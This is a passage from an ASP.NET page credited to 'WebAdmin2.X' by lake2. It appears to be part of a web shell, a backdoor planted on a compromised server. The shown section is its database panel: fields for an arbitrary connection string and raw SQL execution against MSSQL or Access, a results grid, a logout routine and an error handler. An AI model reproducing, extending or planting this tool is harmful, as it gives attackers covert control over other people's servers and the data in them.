<asp:Label ID="Label1" runat="server" />
  <%
  	case "data"
  %>
<form runat="server">
  <p>[Control DataBase for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:closewindow();">关闭</a></i> </p>
  <p>A tool that it can Control Database </p>
<p><asp:Button Text="ReLoad" OnClick="DB_ReLoad" runat="server" CssClass="buttom"></asp:Button></p>
  <p>Connection String : 
    <asp:TextBox ID="DB_CString" Width="500" runat="server" CssClass="TextBox"/>      </p>
  <p>Select Database:
  <asp:RadioButton ID="DB_rB_MSSQL" Text="MSSQL" GroupName="DBSelecting" OnCheckedChanged="DB_onrB_1" AutoPostBack="true" runat="server" CssClass="buttom"/>
  <asp:RadioButton ID="DB_rB_Access" Text="Access" GroupName="DBSelecting" OnCheckedChanged="DB_onrB_2" AutoPostBack="true" runat="server" CssClass="buttom"/>   
  <asp:Button ID="DB_sButton" runat="server" Text="Submit" OnClick="DB_onsB" CssClass="buttom"/>  
  </p> 
  <p><asp:Label ID="db_Label" runat="server"></asp:Label></p>
    <p>
	<asp:Label ID="DB_exe" Text="Execute SQL ( No echo ): " Visible="false" runat="server"/>
    <asp:TextBox ID="DB_EString" Width="500" runat="server" Visible="false" CssClass="TextBox"/>
	<asp:Button ID="DB_eButton" runat="server" Text="Submit" Visible="false" OnClick="DB_oneB" CssClass="buttom"/>
	</p>
  <p>
  <asp:DataGrid ID="DB_DataGrid" with="100%" AllowPaging="true" AllowSorting="true" OnSortCommand="DB_Sort" PageSize="10" OnPageIndexChanged="DB_Page" PagerStyle-Mode="NumericPages" runat="server"></asp:DataGrid>
  </p>
</form>
  <%
	case "logout"
   		session.Abandon()
		response.Write("<script>alert(' 慢走哦！');location.href='" & request.ServerVariables("URL") & "';</sc" & "ript>")
	end select
end if
Catch error_x
	response.Write("<font color=""red"">错误：</font>"&error_x.Message)
End Try
%>
</p>
</p>
<hr noshade>
<script language="javascript">
function closewindow()
{self.close();}
</script>
<p align="center">WebAdmin2.X By <a href="http://lake2.0x54.org" title="Welcome to my page:)" target="_blank"><em>lake2</em></a> from China [<a href="http://blog.csdn.net/lake2/archive/2005/01/27/270921.aspx" target="_blank">反馈</a>]</p>
</body>
</html>
